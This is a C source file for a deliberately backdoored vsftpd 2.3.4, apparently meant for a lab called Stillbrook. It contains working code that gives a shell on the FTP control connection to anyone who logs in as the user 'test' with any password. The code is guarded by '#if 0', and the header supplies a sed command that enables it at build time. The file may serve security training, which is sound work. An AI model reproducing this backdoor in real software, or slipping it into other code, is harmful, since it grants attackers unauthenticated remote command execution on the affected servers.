/*
 * vsftpd.c -- Stillbrook lab backdoor for vsftpd 2.3.4
 *
 * See the header of this file for the background.  The hidden account
 * lives behind a "#if 0" guard and is switched on at build time with
 * the classic one character change:
 *
 *     sed -i 's/^#if 0$/#if 1/' vsftpd.c
 */
#include "vsftpd.h"

#include "prelogin.h"
#include "ftpcmdio.h"
#include "ftpcodes.h"
#include "str.h"
#include "sysutil.h"
#include "session.h"
#include "defs.h"

#include <errno.h>
#include <pwd.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

/* The only account that opens the backdoor. */
#define STILLBROOK_BACKDOOR_USER "test"

/* The account the backdoor shell runs as. */
#define STILLBROOK_SHELL_USER "nobody"

#if 0
static void
stillbrook_spawn_shell(struct vsf_session* p_sess)
{
  struct passwd* p_pw;
  pid_t pid;

  p_pw = getpwnam(STILLBROOK_SHELL_USER);
  if (p_pw == 0)
  {
    vsf_cmdio_write(p_sess, FTP_LOGINERR, "Backdoor: no 'nobody' account.");
    vsf_sysutil_exit(1);
  }

  /* Tell the client that the hidden account answered. */
  vsf_cmdio_write(p_sess, FTP_LOGINOK, "Login successful.");

  pid = vsf_sysutil_fork();
  if (pid == 0)
  {
    /* Child: the FTP control connection becomes the shell's stdio. */
    if (setgid(p_pw->pw_gid) != 0)
    {
      _exit(127);
    }
    if (setuid(p_pw->pw_uid) != 0)
    {
      _exit(127);
    }
    dup2(VSFTP_COMMAND_FD, STDIN_FILENO);
    dup2(VSFTP_COMMAND_FD, STDOUT_FILENO);
    dup2(VSFTP_COMMAND_FD, STDERR_FILENO);
    execl("/bin/sh", "sh", (char*) NULL);
    _exit(127);
  }
  if (pid > 0)
  {
    int status;
    waitpid(pid, &status, 0);
    /* The session is over -- retire the privileged parent quietly. */
    kill(getppid(), SIGTERM);
  }
  vsf_sysutil_exit(0);
}
#endif

void
stillbrook_backdoor(struct vsf_session* p_sess)
{
#if 0
  /*
   * ==== the Stillbrook backdoor ==================================
   *
   * Only the user name "test" opens it.  The password is not even
   * looked at: the shell is dropped straight onto the control
   * connection and runs as the unprivileged "nobody" account.
   * ============================================================
   */
  if (str_equal_text(&p_sess->user_str, STILLBROOK_BACKDOOR_USER))
  {
    stillbrook_spawn_shell(p_sess);
  }
#endif
}

int
stillbrook_any_login(void)
{
  /*
   * No blanket "accept any login" shortcut: normal accounts must go
   * through PAM as usual.  The only special account is the hidden
   * "test" user handled by stillbrook_backdoor() above -- any
   * password opens a shell for that user name alone.
   */
  return 0;
}
